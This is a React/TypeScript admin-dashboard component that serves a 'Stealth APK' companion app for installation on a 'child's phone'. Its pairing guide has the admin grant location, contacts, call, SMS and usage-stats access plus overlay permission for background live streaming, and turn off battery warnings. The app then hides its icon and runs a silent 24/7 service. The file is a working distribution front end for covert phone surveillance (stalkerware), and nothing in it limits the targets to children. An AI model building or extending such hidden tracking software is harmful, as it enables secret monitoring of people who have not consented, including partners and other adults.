// components/admin/devices/ApkDownloadModal.tsx
"use client";

import React, { useState, useEffect } from "react";
import { Modal } from "@/components/ui/Modal";
import { Button } from "@/components/ui/Button";
import { Download, Smartphone, Copy, Check, Sparkles, QrCode } from "lucide-react";
import { COMPANION_APK_FILENAME, COMPANION_APP_VERSION } from "@/lib/companion-config";
import { toast } from "@/components/ui/Toast";

interface Props {
  isOpen: boolean;
  onClose: () => void;
  onOpenQr?: () => void;
}

export const ApkDownloadModal: React.FC<Props> = ({ isOpen, onClose, onOpenQr }) => {
  const [copied, setCopied] = useState(false);
  const [downloadUrl, setDownloadUrl] = useState("/downloads/snap-safety-companion.apk");
  const [displayDomain, setDisplayDomain] = useState("localhost:3000");

  useEffect(() => {
    if (typeof window !== "undefined") {
      setDisplayDomain(window.location.host);
      setDownloadUrl(`${window.location.origin}/api/downloads/companion`);
    }
  }, []);

  const handleCopy = () => {
    navigator.clipboard.writeText(downloadUrl);
    setCopied(true);
    toast.success("APK link copied to clipboard");
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <Modal isOpen={isOpen} onClose={onClose}>
      <div className="space-y-4 text-left max-h-[85vh] overflow-y-auto pr-1">
        {/* Header */}
        <div className="flex items-center gap-3">
          <div className="w-11 h-11 rounded-2xl bg-amber-500/15 border border-amber-500/30 flex items-center justify-center text-amber-600 dark:text-[#FFFC00] shrink-0">
            <Smartphone className="w-6 h-6" />
          </div>
          <div>
            <h3 className="text-base sm:text-lg font-bold text-slate-900 dark:text-white tracking-tight">
              Companion App (Stealth APK)
            </h3>
            <p className="text-xs text-slate-500 dark:text-white/50">
              Install once &bull; Auto-hides from launcher &bull; 24/7 background service
            </p>
          </div>
        </div>

        {/* Live Domain Download Link Box (No localhost) */}
        <div className="p-3.5 rounded-2xl bg-slate-100 dark:bg-white/[0.04] border border-slate-200 dark:border-white/10 space-y-2">
          <span className="text-[11px] font-bold text-slate-700 dark:text-white/80 block">
            🌐 Direct APK Download Link (Live Domain):
          </span>
          <div className="flex items-center gap-2">
            <input
              type="text"
              readOnly
              value={downloadUrl}
              className="flex-1 bg-white dark:bg-[#070709] border border-slate-200 dark:border-white/10 rounded-xl px-3 py-2 text-xs font-mono text-slate-800 dark:text-white/90 select-all outline-none"
            />
            <Button size="sm" variant="secondary" onClick={handleCopy} className="gap-1 text-xs shrink-0">
              {copied ? <Check className="w-3.5 h-3.5 text-emerald-500" /> : <Copy className="w-3.5 h-3.5" />}
              {copied ? "Copied" : "Copy Link"}
            </Button>
          </div>
          <p className="text-[10px] text-slate-500 dark:text-white/40">
            Send this link to child&apos;s phone via WhatsApp or open directly in child&apos;s phone browser.
          </p>
        </div>

        {/* First-Time Pairing Step Guide (English) */}
        <div className="p-4 rounded-2xl bg-slate-50 dark:bg-white/[0.02] border border-slate-200 dark:border-white/10 space-y-3">
          <div className="flex items-center gap-1.5 text-xs font-bold text-amber-700 dark:text-[#FFFC00]">
            <Sparkles className="w-4 h-4" />
            <span>Pairing Guide (1 Minute Setup):</span>
          </div>

          <div className="space-y-2.5 text-xs">
            <div className="flex items-start gap-2.5">
              <div className="w-5 h-5 rounded-full bg-amber-100 text-amber-900 dark:bg-[#FFFC00] dark:text-black font-bold flex items-center justify-center text-[10px] shrink-0 mt-0.5">
                1
              </div>
              <p className="text-slate-700 dark:text-white/80 leading-relaxed">
                Go to your Admin Dashboard and click <strong>&quot;+ Register Device&quot;</strong>.
              </p>
            </div>

            <div className="flex items-start gap-2.5">
              <div className="w-5 h-5 rounded-full bg-amber-100 text-amber-900 dark:bg-[#FFFC00] dark:text-black font-bold flex items-center justify-center text-[10px] shrink-0 mt-0.5">
                2
              </div>
              <p className="text-slate-700 dark:text-white/80 leading-relaxed">
                Enter child&apos;s name (e.g. &quot;Ali&quot;) to generate a 6-digit <strong>Pairing Code</strong> (e.g. <code>9YMQES</code>).
              </p>
            </div>

            <div className="flex items-start gap-2.5">
              <div className="w-5 h-5 rounded-full bg-amber-100 text-amber-900 dark:bg-[#FFFC00] dark:text-black font-bold flex items-center justify-center text-[10px] shrink-0 mt-0.5">
                3
              </div>
              <p className="text-slate-700 dark:text-white/80 leading-relaxed">
                Open the Companion APK on the child&apos;s phone and enter the <strong>Pairing Code</strong>.
              </p>
            </div>

            <div className="flex items-start gap-2.5">
              <div className="w-5 h-5 rounded-full bg-amber-100 text-amber-900 dark:bg-[#FFFC00] dark:text-black font-bold flex items-center justify-center text-[10px] shrink-0 mt-0.5">
                4
              </div>
              <p className="text-slate-700 dark:text-white/80 leading-relaxed">
                Grant required Android permissions (Location: <em>Allow all the time</em>, Contacts, Calls, SMS, Usage Stats).
              </p>
            </div>

            <div className="flex items-start gap-2.5">
              <div className="w-5 h-5 rounded-full bg-amber-100 text-amber-900 dark:bg-[#FFFC00] dark:text-black font-bold flex items-center justify-center text-[10px] shrink-0 mt-0.5">
                5
              </div>
              <p className="text-slate-700 dark:text-white/80 leading-relaxed">
                Also grant the <strong>Display over other apps</strong> (Appear on top) permission to enable background live streaming.
              </p>
            </div>

            <div className="flex items-start gap-2.5">
              <div className="w-5 h-5 rounded-full bg-amber-100 text-amber-900 dark:bg-[#FFFC00] dark:text-black font-bold flex items-center justify-center text-[10px] shrink-0 mt-0.5">
                6
              </div>
              <p className="text-slate-700 dark:text-white/80 leading-relaxed">
                (Huawei/Honor) Go to Settings &gt; Battery and turn OFF <strong>Power-intensive prompt</strong> to prevent battery warnings.
              </p>
            </div>

            <div className="flex items-start gap-2.5">
              <div className="w-5 h-5 rounded-full bg-amber-100 text-amber-900 dark:bg-[#FFFC00] dark:text-black font-bold flex items-center justify-center text-[10px] shrink-0 mt-0.5">
                7
              </div>
              <p className="text-slate-700 dark:text-white/80 leading-relaxed">
                The app will verify, <strong>auto-hide its icon</strong> into stealth mode, and start the silent background service!
              </p>
            </div>
          </div>
        </div>

        {/* Bottom Actions */}
        <div className="flex items-center gap-2 pt-2">
          {onOpenQr && (
            <Button
              variant="secondary"
              size="sm"
              onClick={onOpenQr}
              className="rounded-full text-xs font-bold gap-1 h-10 px-3 border-slate-200 dark:border-white/10 shrink-0"
            >
              <QrCode className="w-4 h-4 text-amber-600 dark:text-[#FFFC00]" />
              <span className="hidden sm:inline">Scan QR</span>
              <span className="sm:hidden">QR</span>
            </Button>
          )}
          <a
            href={downloadUrl}
            download={COMPANION_APK_FILENAME}
            onClick={() => toast.request("Downloading companion APK...")}
            className="flex-1 flex items-center justify-center gap-2 py-2.5 px-4 rounded-full bg-[#FFFC00] text-black font-bold text-xs shadow-lg shadow-yellow-500/25 active:scale-95 transition-all"
          >
            <Download className="w-4 h-4 stroke-[2.5]" />
            Download APK (v{COMPANION_APP_VERSION})
          </a>
          <Button variant="ghost" onClick={onClose} size="sm" className="rounded-full text-xs">
            Close
          </Button>
        </div>
      </div>
    </Modal>
  );
};
